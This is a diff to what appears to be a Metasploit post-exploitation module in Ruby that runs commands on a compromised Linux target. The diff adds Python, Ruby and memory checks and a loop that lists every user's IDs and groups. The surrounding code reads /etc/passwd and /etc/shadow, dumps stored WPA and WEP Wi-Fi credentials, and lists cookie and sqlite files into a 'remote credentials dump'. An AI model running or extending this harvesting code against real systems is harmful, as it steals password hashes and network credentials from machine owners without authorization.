@@ -208,6 +208,8 @@ def run
       date_out = cmd_exec("date")
       file_sys = cmd_exec("df -H")
       mont_uuid = cmd_exec("lsblk -f")
+      py_version = cmd_exec("python -V")
+      ruby_version = cmd_exec("ruby -v")
       storage_mont = cmd_exec("lsblk -m")
       distro_uname = cmd_exec("uname -a")
       net_stat = cmd_exec("netstat -tulpn")
@@ -220,6 +222,7 @@ def run
       mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
       sys_lang = cmd_exec("set | egrep '^(LANG|LC_)' | cut -d '=' -f2 | cut -d '.' -f1")
       mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
+      mem_available = cmd_exec("cat /proc/meminfo | grep \"MemAvailable\" | awk {'print $2,$3'}")
       model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
       distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION=' | cut -d '=' -f2")
       localhost_ip = cmd_exec("ping -c 1 localhost | head -n 1 | awk {'print $3'} | cut -d '(' -f2 | cut -d ')' -f1")
@@ -241,8 +244,11 @@ def run
         data_dump << "CPU (Model name)    : #{model_name}\n"
         data_dump << "Target mem free     : #{mem_free}\n"
         data_dump << "Target mem total    : #{mem_total}\n"
+        data_dump << "Target mem available: #{mem_available}\n"
         data_dump << "Target mem dirty    : #{mem_dirty}\n"
         data_dump << "System language     : #{sys_lang}\n"
+        data_dump << "Python version      : #{py_version}\n"
+        data_dump << "Ruby version        : #{ruby_version}\n"
         data_dump << "Target interface    : #{interface}\n"
         data_dump << "Target IP addr      : #{host_ip}\n"
         data_dump << "Target gateway      : #{gateway}\n"
@@ -353,6 +359,7 @@ def run
           #
           # bash commands to be executed remotely ..
           #
+          # dump cookies
           list_sqlite = cmd_exec("ls -a -R /root | grep \"sqlite\"")
           list_cookies = cmd_exec("ls /usr/share/pyshared/mechanize | grep \"cookie\"")
           # Dump target WIFI credentials stored ..
@@ -361,6 +368,8 @@ def run
           # dump etc/passwd & etc/shadow files from target
           etc_pass = cmd_exec("cat /etc/passwd")
           etc_shadow = cmd_exec("cat /etc/shadow")
+          # list all uuid id's
+          uuid_id = cmd_exec("for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done")
             print_status("Storing scan results into msf database ..")
             Rex::sleep(0.7)
             #
@@ -371,6 +380,10 @@ def run
             data_dump << "|  REMOTE CREDENTIALS DUMP |\n"
             data_dump << "+--------------------------+\n"
             data_dump << "\n\n"
+            data_dump << "LISTING IDs AND GROUPs :\n"
+            data_dump << "------------------------\n"
+            data_dump << uuid_id
+            data_dump << "\n\n"
             data_dump << "WPA CREDENTIALS :\n"
             data_dump << "-----------------\n"
             data_dump << wpa_out
@@ -379,16 +392,16 @@ def run
             data_dump << "-----------------\n"
             data_dump << wep_out
             data_dump << "\n\n"
-            data_dump << "ETC/PASSWD :\n"
-            data_dump << "------------\n"
+            data_dump << "ETC/PASSWD FILE:\n"
+            data_dump << "----------------\n"
             data_dump << etc_pass
             data_dump << "\n\n"
-            data_dump << "ETC/SHADOW :\n"
-            data_dump << "------------\n"
+            data_dump << "ETC/SHADOW FILE:\n"
+            data_dump << "----------------\n"
             data_dump << etc_shadow
             data_dump << "\n\n"
-            data_dump << "LIST COOKIES :\n"
-            data_dump << "--------------\n"
+            data_dump << "LISTING COOKIES :\n"
+            data_dump << "-----------------\n"
             data_dump << list_cookies
             data_dump << "\n\n"
             data_dump << list_sqlite
